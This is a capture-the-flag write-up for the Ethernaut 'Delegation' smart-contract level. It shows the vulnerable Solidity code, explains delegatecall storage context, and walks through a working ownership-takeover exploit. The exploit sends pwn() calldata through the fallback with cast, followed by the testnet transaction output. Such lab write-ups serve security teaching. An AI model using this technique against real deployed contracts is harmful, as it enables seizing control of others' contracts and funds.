---
title: "Delegation"
tags: ["delegatecall"]
reference: https://ethernaut.openzeppelin.com/level/0x73379d8B82Fda494ee59555f333DF7D44483fD58
---

# Description

The goal of this level is for you to claim ownership of the instance you are given.

Things that might help

- Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
- Fallback methods
- Method ids

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

# Solution

1. what is `delegatecall`?

The `delegatecall` is identical to a message call apart from the fact that the code at the target address is executed in the context (i.e. at the address) of the calling contract and msg.sender and msg.value do not change their values.

So if the `pwn()` function of `Delegate` contract is invoked by `Delegation` contract's `delegatecall(msg.data)`, the `Delegation`'s `owner` state variable will be used.

2. encode the `pwn()` function

```
cast calldata "pwn()"
0xdd365b8b
```

3. trigger the fallback function of `Delegation` contract

```
cast send 0xBD2F6ac54419A8E564ec8d206199b0C417DEfC76 0xdd365b8b --rpc-url $BASE_SEPOLIA_RPC --private-key

blockHash            0xa57f0d77b2bc8789b9417652093c0b234506e1c42c18cefbcff3dd67b93960be
blockNumber          8922372
contractAddress
cumulativeGasUsed    9768299
effectiveGasPrice    1000081
from                 0xB1473Ba227C4645501E0e05f4839b00ED8320d33
gasUsed              31204
logs                 []
logsBloom            0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root
status               1 (success)
transactionHash      0xd9f4dd20825103e83e3d1d00b27e74c73c4fbbae6590f072ceda9350da98c762
transactionIndex     98
type                 2
blobGasPrice
blobGasUsed
to                   0xBD2F6ac54419A8E564ec8d206199b0C417DEfC76
```

4. check the contract owner

```
await contract.owner()
'0xB1473Ba227C4645501E0e05f4839b00ED8320d33'
```
